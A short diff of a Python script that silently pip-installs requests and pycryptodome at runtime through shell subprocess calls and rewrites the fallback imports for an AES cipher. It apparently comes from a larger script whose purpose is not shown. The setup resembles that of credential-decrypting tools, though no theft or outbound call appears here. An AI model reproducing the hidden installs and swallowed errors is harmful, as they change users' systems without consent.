@@ -60,7 +60,7 @@ else:
     
 requirements = [
     ["requests", "requests"],
-    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodomex']
+    ["Cryptodome.Cipher", "pycryptodomex" if not 'PythonSoftwareFoundation' in executable else 'pycryptodome']
 ]
 
 for module in requirements:
@@ -69,12 +69,18 @@ for module in requirements:
     except:
         subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True)
         time.sleep(3)
-try:
-    from Cryptodome.Cipher import AES
+try:          
+    try:
+        from Cryptodome.Cipher import AES
+    except:
+        try:
+            from Crypto.Cipher import AES
+        except:
+            subprocess.Popen(executable + " -m pip install pycryptodome  ", shell=True)
+            from Crypto.Cipher import AES
 except:
-    subprocess.Popen(executable + " -m pip install Crypto ", shell=True)
-    from Crypto.Cipher import AES
-    
+    pass
+
 import requests
         
 def error_Handler(err):
